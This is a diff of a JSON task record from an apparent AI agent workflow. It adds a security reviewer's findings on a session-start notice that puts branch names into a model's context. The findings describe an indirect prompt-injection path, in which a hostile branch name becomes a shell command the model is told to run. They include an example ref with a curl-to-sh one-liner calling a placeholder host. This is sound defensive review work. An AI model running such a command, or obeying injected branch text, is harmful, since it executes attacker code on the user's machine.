@@ -5,7 +5,7 @@
   "roleTask": "Reviewer.security",
   "slug": "check-the-session-start-and-status",
   "objective": "Check the session-start and status notice added by the cloud-session checkout change for security issues.",
-  "state": "Running",
+  "state": "Succeeded",
   "scope": [
     "The change is commit 2dedb01 on release/0.3.0/fix/cloud-session-branch in /home/user/holyagent-0.3.0-cloudbranch (git diff HEAD~1 HEAD; without generated output as the file /tmp/claude-0/-home-user-holyagent/43946df6-456d-58c6-bea3-7e958fcb9495/scratchpad/cloud-r0.diff). Its goal: in a claude.ai cloud session the session panel shows the primary checkout's branch and diff with a Create PR button, so the root keeps the primary checkout on the platform-assigned branch at its start and works in worktrees; session start and holyagent status add a notice when that checkout is detached; docs explain the panel and that the label cannot be renamed. The writer's report is /home/user/holyagent/.git/holyagent/reports/assignment-0mw98bm41-hhjx.md.",
     "The notice runs git in the session-start hook (a privileged surface) and reads the reflog and branch names into the model's context; trace those sources to sinks (shell construction, injection of branch names into context, failure handling)."
@@ -33,7 +33,25 @@
     "agentId": "workflow:wf_352521d4-e12/assignment-0mw98v1e0-v4vz",
     "model": "sonnet",
     "effort": "high",
-    "startedAt": "2026-11-09T12:35:25.513Z"
+    "startedAt": "2026-11-09T12:35:25.513Z",
+    "finishedAt": "2026-11-09T12:45:58.916Z"
+  },
+  "result": "result: Not blocked outright, but the criterion is only partly met. The new git calls are safe from process injection. Branch text reaches the model context with git's ref-format check as its only validation, and that check allows shell metacharacters and non-ASCII control characters. I rate this low-to-medium and recommend fixing it.\n\nThe built-in `/security-review` could not run. The skill failed on `git diff --name-only origin/HEAD...` because `origin/HEAD` does not exist, so it covered nothing. I reviewed the diff by hand at `/tmp/claude-0/-home-user-holyagent/43946df6-456d-58c6-bea3-7e958fcb9495/scratchpad/cloud-r0.diff`, plus `vcs/git.ts`, `vcs/process.ts` and `vcs/identity.ts`. I had no shell, so I did not run `git check-ref-format`. The character-set claims below come from git's documented rules.\n\n**Findings**\n1. **Validated, introduced by this change:**\n   - **Path:** two branch names go into `cloudCheckoutNotice` in `/home/user/holyagent-0.3.0-cloudbranch/packages/runtime/src/cli/status.ts` line 154 and then into model context. The first comes from the reflog (`%gs`), after a `show-ref refs/heads/<name>` existence check. The second is `origin/HEAD` via `symbolic-ref --short`, with no check at all.\n   - **Where it lands:** the name is placed unescaped as `` `git switch ${branch}` `` and told to the model as the command to run. It reaches the session-start `additionalContext` and the `notice` field of `status`.\n   - **Why the checks fall short:** git ref rules reject spaces, ASCII control characters, and `~^:?*[\\`. They allow `; | & $ ( ) { } < > \" ' `` ` `` #`, C1 control characters (0x80–0x9f) and Unicode bidi or zero-width characters.\n   - **Example:** a ref named like ``x;curl${IFS}host/p|sh`` is a valid ref. The model is told to run it, and a shell would execute it.\n   - **Precondition:** a hostile name must reach the primary checkout's reflog, for example by running `git switch <pr-branch>` (a hostile PR branch fetched for review) from the primary checkout, or the remote's default branch name for a third-party repo. The `origin/HEAD` fallback is the case with no check at all.\n   - **Impact:** an indirect prompt injection that suggests a shell command.\n   - **Fix:** allow the name into the notice only if it matches `/^[A-Za-z0-9][A-Za-z0-9._\\/-]*$/` and passes the existing `validBranch` check; otherwise use `main`. Applying this to both sources also stops a backtick in the name from breaking the markdown span.\n\n2. **Suspicion, minor:** the reflog regex `(.+)` is greedy and the lines are not size-capped. The `show-ref` check discards any junk, so I found no exploit.\n\n**Checked and sound**\n**No shell injection in the git calls:** `spawn` uses the Bun `$` template with an args array, so each argument is escaped. The argument vectors are fixed except for `refs/heads/${name}`, which cannot be read as an option because of the prefix.\n**Failure handling:** `gitMaybe` maps any non-zero exit to `undefined`, `.nothrow()` is set, and the notice is `undefined` on any failure. A git failure does not crash the hook, and nothing blocks.\n**Git commands run:** `rev-parse`, `reflog`, `show-ref` and `symbolic-ref` do not run `fsmonitor` or other repository-config hooks.\n**Cloud gate:** it is exactly `CLAUDE_CODE_REMOTE === \"true\"`. The `rev-parse` check that `--git-dir` equals `--git-common-dir` correctly excludes linked worktrees.\n**Notice text and secrets:** it is a single line from a fixed template. The JSON/TOON encoding is safe for newlines and quotes, and no secrets are read or logged.\n\nevidence:\nNo injection or unsafe process use in the new git calls, and branch or reflog text reaching the model context cannot carry instructions or control characters unchecked: Process use is sound (`vcs/process.ts` line 29, args array, no shell). Branch text is not sufficiently checked: finding 1, `cli/status.ts` lines 119-131 and 154. The `origin/HEAD` fallback is unchecked, and shell metacharacters and C1 or bidi characters are allowed through.\nfindings: Finding 1 (validated weakness, introduced by this change, fixable by an allowlist regex on the name) and finding 2 (minor suspicion). `/security-review` did not run because `origin/HEAD` was unresolved.\n",
+  "acceptance": {
+    "revision": 1,
+    "rationale": "Findings carry file lines and a reproduction; they start the repair",
+    "criteria": [
+      {
+        "criterion": "No injection or unsafe process use in the new git calls, and branch or reflog text reaching the model context cannot carry instructions or control characters unchecked",
+        "support": "Process use is sound (`vcs/process.ts` line 29, args array, no shell). Branch text is not sufficiently checked: finding 1, `cli/status.ts` lines 119-131 and 154. The `origin/HEAD` fallback is unchecked, and shell metacharacters and C1 or bidi characters are allowed through."
+      }
+    ],
+    "evidence": [
+      {
+        "label": "findings",
+        "support": "Finding 1 (validated weakness, introduced by this change, fixable by an allowlist regex on the name) and finding 2 (minor suspicion). `/security-review` did not run because `origin/HEAD` was unresolved."
+      }
+    ]
   },
   "createdAt": "2026-11-09T12:35:25.513Z"
 }
